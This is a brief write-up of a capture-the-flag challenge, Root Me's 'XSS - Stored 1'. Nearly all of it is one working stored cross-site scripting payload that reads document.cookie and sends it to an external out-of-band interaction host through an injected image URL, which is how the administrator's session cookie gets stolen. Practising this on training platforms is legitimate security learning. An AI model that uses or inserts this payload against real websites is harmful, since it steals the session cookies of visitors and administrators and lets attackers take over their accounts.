# XSS stored 1

[root-me challenge XSS - Stored 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1): Steal the administrator session cookie and use it to validate the challenge.

----

Using [app.interactsh.com](https://app.interactsh.com), use whatever title, and message (change `src` to whatever OAST app you are using):

```text
<script>document.write("<img src='https://cgn1cqt2vtc0000xbc8ggekoscryyyyyb.oast.fun?="+document.cookie+"'></img>");</script>
```
